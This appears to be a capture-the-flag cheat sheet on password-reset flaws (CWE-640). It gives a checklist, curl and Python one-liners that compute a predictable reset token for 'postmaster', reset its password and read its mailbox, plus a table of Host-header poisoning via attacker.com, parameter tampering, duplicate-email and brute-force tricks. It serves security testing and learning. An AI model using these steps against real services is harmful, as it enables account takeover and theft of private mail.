# Password reset / account recovery flaws (CWE-640)

**Signs**: "Forgot password?", reset links `/reset/<token>` or `?token=`, security questions.
Hint "same key cut twice", "for a name alone, no clock", "never wears out".

## Checklist
1. **Request a reset for your own account** and capture the token. "Sent to your email" pages
   sometimes hide the link in the HTML (`display:none`) or in the response JSON — view source.
2. Request it twice: **same token both times?** ⇒ deterministic.
3. Does it expire? Can it be reused? Is it bound to the account it was issued for?
4. Guess the recipe → [predictable-tokens](predictable-tokens.md) (`token_recipe.py`), e.g.
   `sha256("reset:"+username)[:20]`, `md5(email)`, `base64(username)`.
5. Compute the token for the **target** (admin/postmaster/support — look in footers/contacts).
```bash
python -c "import hashlib;print(hashlib.sha256(b'reset:postmaster').hexdigest()[:20])"
curl -s -c j -b j -d 'password=pwned123' $T/reset/<token>
curl -s -c j -b j -d 'username=postmaster&password=pwned123' $T/login; curl -s -b j $T/mailbox
```

## Other recovery bugs
| Bug | Test |
|---|---|
| Host-header poisoning | `POST /forgot` with `Host: attacker.com` → link points to you |
| Token leaked in response / Referer | inspect responses, 3rd-party resources on reset page |
| Param tampering | `POST /reset` with `user=admin` alongside your valid token |
| Two emails | `email=me@x.com&email=admin@x.com`, `email=me@x.com,admin@x.com` |
| Security questions | public answers (pet, city), brute-forceable |
| No rate-limit on 4–6 digit codes | brute force 0000–999999 |

Seen in: `auth11` (InboxNow: reset token `sha256("reset:"+user)[:20]`, footer names `postmaster`).
